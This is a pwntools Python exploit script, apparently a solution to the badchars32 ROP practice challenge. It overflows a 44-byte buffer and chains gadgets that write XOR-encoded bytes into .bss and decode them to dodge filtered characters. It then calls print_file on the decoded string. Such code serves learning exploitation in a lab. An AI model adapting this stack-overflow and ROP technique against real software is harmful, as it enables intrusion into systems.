#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./badchars32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
pad=b"C"*44
bssAddress=0x0804a020
rop=ROP(exe)
rop.raw(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
rop.raw('%/"$')
rop.raw(bssAddress)
rop.raw(bssAddress)
rop.raw(0x0804854f) # mov dword ptr [edi], esi ; ret 
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
rop.raw('m7;7')
rop.raw(bssAddress+4)
rop.raw(bssAddress+1)
rop.raw(0x0804854f) # mov dword ptr [edi], esi ; ret
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485bb) # pop ebp ; ret
rop.raw(bssAddress+2)
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485bb) # pop ebp ; ret
rop.raw(bssAddress+3)
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485bb) # pop ebp ; ret
rop.raw(bssAddress+4)
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485bb) # pop ebp ; ret
rop.raw(bssAddress+5)
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485bb) # pop ebp ; ret
rop.raw(bssAddress+6)
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.raw(0x080485bb) # pop ebp ; ret
rop.raw(bssAddress+7)
rop.raw(0x08048547) # 0x08048547 : xor byte ptr [ebp], bl ; ret
rop.print_file(0x0804a020)

payload=(
    pad+rop.chain()
)

io = start()
io.sendline(payload)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

